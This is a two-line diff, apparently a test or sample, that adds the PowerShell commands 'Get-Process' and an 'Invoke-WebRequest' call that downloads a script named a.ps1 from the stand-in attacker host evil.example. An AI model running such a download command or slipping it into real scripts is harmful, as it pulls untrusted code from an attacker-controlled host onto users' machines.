@@ -1,0 +1,2 @@
+Get-Process
+Invoke-WebRequest http://evil.example/a.ps1 -OutFile a.ps1
